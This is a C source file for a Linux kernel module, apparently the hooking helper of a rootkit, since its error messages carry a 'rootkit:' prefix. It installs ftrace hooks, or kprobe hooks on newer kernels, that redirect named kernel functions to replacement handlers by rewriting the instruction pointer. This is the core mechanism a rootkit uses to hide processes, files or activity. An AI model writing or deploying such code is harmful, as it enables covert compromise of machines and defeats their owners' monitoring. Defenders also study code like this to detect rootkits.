#include "ftrace_helper.h"
#include <linux/kallsyms.h>
#include <linux/slab.h>

#ifdef USE_FTRACE_HOOKS
static void notrace fh_ftrace_thunk(unsigned long ip, unsigned long parent_ip,
                                    struct ftrace_ops *ops, struct ftrace_regs *fregs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!regs || within_module(parent_ip, THIS_MODULE))
        return;

    regs->ip = (unsigned long)hook->function;
}

int fh_install_hook(struct ftrace_hook *hook) {
    int err;
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) {
        pr_err("rootkit: unresolved symbol: %s\n", hook->name);
        return -ENOENT;
    }

    *((unsigned long *)hook->original) = hook->address;
    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (err) {
        pr_err("rootkit: ftrace_set_filter_ip() failed: %d\n", err);
        return err;
    }

    err = register_ftrace_function(&hook->ops);
    if (err) {
        pr_err("rootkit: register_ftrace_function() failed: %d\n", err);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return err;
    }

    return 0;
}

void fh_remove_hook(struct ftrace_hook *hook) {
    unregister_ftrace_function(&hook->ops);
    ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
}
#else
/* KPROBE IMPLEMENTATION (Kernels >= 6.6) */
static int kprobe_pre_handler(struct kprobe *p, struct pt_regs *regs) {
    struct ftrace_hook *hook = container_of(p, struct ftrace_hook, kp);
    regs->ip = (unsigned long)hook->function;
    return 1;
}

int fh_install_hook(struct ftrace_hook *hook) {
    hook->address = kallsyms_lookup_name(hook->name);
    if (!hook->address) return -ENOENT;
    *((unsigned long *)hook->original) = hook->address;
    hook->kp.pre_handler = kprobe_pre_handler;
    hook->kp.addr = (kprobe_opcode_t *)hook->address;
    return register_kprobe(&hook->kp);
}

void fh_remove_hook(struct ftrace_hook *hook) {
    unregister_kprobe(&hook->kp);
}
#endif

int fh_install_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    int err;
    for (i = 0; i < count; i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            goto error;
    }
    return 0;
error:
    while (i != 0)
        fh_remove_hook(&hooks[--i]);
    return err;
}

void fh_remove_hooks(struct ftrace_hook *hooks, size_t count) {
    size_t i;
    for (i = 0; i < count; i++)
        fh_remove_hook(&hooks[i]);
}